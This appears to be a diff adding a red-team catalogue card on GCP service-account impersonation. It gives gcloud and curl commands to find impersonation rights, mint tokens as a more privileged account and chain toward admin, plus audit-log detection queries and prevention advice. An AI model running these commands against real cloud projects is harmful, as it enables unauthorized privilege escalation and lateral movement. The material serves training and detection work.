@@ -1,0 +1,104 @@
+{
+  "id": "gcp-sa-impersonation",
+  "name": "GCP Service Account Impersonation - getAccessToken / actAs",
+  "command": "gcloud auth print-access-token --impersonate-service-account=<target>",
+  "description": "Impersonate a higher-privileged GCP service account using iam.serviceAccounts.getAccessToken (or signJwt/getOpenIdToken). With roles/iam.serviceAccountTokenCreator (or actAs) over a target SA, mint short-lived access tokens as that SA and inherit its permissions - a primary GCP privilege-escalation path that needs no key file and leaves the attacker acting as a different identity.",
+  "platform": "multi",
+  "type": "command",
+  "opsec": "quiet",
+  "category": "Cloud Security",
+  "subcategory": "GCP Attacks",
+  "certifications": [
+    "MCRTA"
+  ],
+  "primary_cert": "MCRTA",
+  "source": "Rhino Security Labs / GCP docs",
+  "tags": [
+    "gcp",
+    "service-account",
+    "impersonation",
+    "token-creator",
+    "actas",
+    "privesc",
+    "iam"
+  ],
+  "mitre": [
+    "T1078.004",
+    "T1098"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE PRIMITIVE ===\n  If you (or an SA you control) have iam.serviceAccounts.getAccessToken on a\n  target SA (role roles/iam.serviceAccountTokenCreator), you can mint tokens\n  AS that SA. getOpenIdToken / signJwt are related primitives.\n\n=== FIND WHERE YOU CAN IMPERSONATE ===\n  gcloud iam service-accounts list\n  # who has TokenCreator on a given SA:\n  gcloud iam service-accounts get-iam-policy <target>\n  # project-wide view:\n  gcloud projects get-iam-policy <project> --format=json\n\n=== MINT A TOKEN AS THE TARGET SA ===\n  gcloud auth print-access-token --impersonate-service-account=<target>\n  # or attach impersonation to any gcloud command:\n  gcloud storage ls --impersonate-service-account=<target>\n  gcloud compute instances list --impersonate-service-account=<target>\n\n=== RAW API (explicit) ===\n  curl -X POST -H \"Authorization: Bearer $(gcloud auth print-access-token)\" \\\n    -H 'Content-Type: application/json' \\\n    \"https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<target>:generateAccessToken\" \\\n    -d '{\"scope\":[\"https://www.googleapis.com/auth/cloud-platform\"]}'\n\n=== actAs CHAINING ===\n  roles/iam.serviceAccountUser (actAs) lets you attach a privileged SA to a\n  new resource (VM, function, job) that then runs as that SA - see the\n  Cloud Function privesc card.\n\n=== NEXT ===\n  Chain: impersonate SA_A, which can impersonate SA_B, up to an admin SA.",
+  "examples": [
+    {
+      "label": "Print an access token as the target SA",
+      "command": "gcloud auth print-access-token --impersonate-service-account=<target>"
+    },
+    {
+      "label": "Run a command as the impersonated SA",
+      "command": "gcloud storage ls --impersonate-service-account=<target>"
+    },
+    {
+      "label": "Check who can impersonate an SA",
+      "command": "gcloud iam service-accounts get-iam-policy <target>"
+    }
+  ],
+  "references": [
+    {
+      "title": "Rhino Security Labs - GCP privilege escalation",
+      "url": "https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/"
+    },
+    {
+      "title": "GCP docs - Create short-lived credentials (impersonation)",
+      "url": "https://cloud.google.com/iam/docs/create-short-lived-credentials-direct"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "gcp-iam-privesc",
+      "note": "Broader catalogue of GCP IAM privesc primitives.",
+      "rel": "alternative"
+    },
+    {
+      "id": "gcp-iam-enum",
+      "note": "Enumerate IAM policies to find impersonation rights.",
+      "rel": "prereq"
+    },
+    {
+      "id": "gcp-cloudfunction-deploy-privesc",
+      "note": "actAs chaining via attaching an SA to a function.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Service-account impersonation is a sanctioned GCP feature. The IAM role roles/iam.serviceAccountTokenCreator grants iam.serviceAccounts.getAccessToken, and anyone holding it over a target SA can mint short-lived tokens as that SA and inherit its roles - no key file, just an API call.",
+    "prerequisites": "A principal (user or SA) with roles/iam.serviceAccountTokenCreator (or actAs / serviceAccountUser for resource-attach chaining) over a more privileged target service account.",
+    "impact": "Privilege escalation to the target SA's permissions and lateral movement by chaining impersonation across SAs toward project owner/editor; the attacker operates under a different identity, complicating attribution.",
+    "detection": "[MITRE T1078.004] Cloud Audit Logs GenerateAccessToken / GenerateIdToken / SignJwt calls on iamcredentials.googleapis.com, especially new principal->target pairs or chains; impersonated tokens used from unusual IPs.",
+    "artifacts": "Audit log entries protoPayload.serviceName=iamcredentials.googleapis.com with methodName GenerateAccessToken/GenerateIdToken/SignJwt, authenticationInfo.principalEmail (caller) and request.name (target SA); downstream API calls attributed to the target SA.",
+    "splunk_spl": "index=gcp (protoPayload.serviceName=iamcredentials.googleapis.com)\n| search protoPayload.methodName=\"*GenerateAccessToken*\" OR protoPayload.methodName=\"*GenerateIdToken*\" OR protoPayload.methodName=\"*SignJwt*\"\n| stats count by protoPayload.authenticationInfo.principalEmail, protoPayload.request.name",
+    "elastic_kql": "gcp.audit.service_name:\"iamcredentials.googleapis.com\" and gcp.audit.method_name:(*GenerateAccessToken* or *GenerateIdToken* or *SignJwt*)",
+    "sentinel_kql": "GCPAuditLogs\n| where ServiceName == \"iamcredentials.googleapis.com\"\n| where MethodName has_any (\"GenerateAccessToken\",\"GenerateIdToken\",\"SignJwt\")\n| summarize Count=count() by PrincipalEmail, ResourceName",
+    "sigma_rules": "gcp_service_account_impersonation",
+    "prevention": "Grant roles/iam.serviceAccountTokenCreator and serviceAccountUser narrowly and per-SA (never at project level); prefer workload identity over keys; use IAM Recommender to strip unused impersonation rights; enable Data Access audit logs for IAM Credentials; alert on new impersonation principal/target pairs and on chains.",
+    "sources": [
+      "https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/",
+      "https://cloud.google.com/iam/docs/create-short-lived-credentials-direct"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Service account access-token impersonation",
+        "logic": "GCPAuditLogs\n| where ServiceName == \"iamcredentials.googleapis.com\"\n| where MethodName has_any (\"GenerateAccessToken\",\"GenerateIdToken\",\"SignJwt\")\n| summarize Count=count() by PrincipalEmail, ResourceName",
+        "data_source": "gcp-audit",
+        "attack": [
+          "T1078.004",
+          "T1098"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Legitimate automation and workload-identity flows that impersonate SAs",
+        "tuning": "Baseline normal caller->target impersonation pairs; alert on new pairs, cross-project targets, or impersonation chains"
+      }
+    ]
+  }
+}
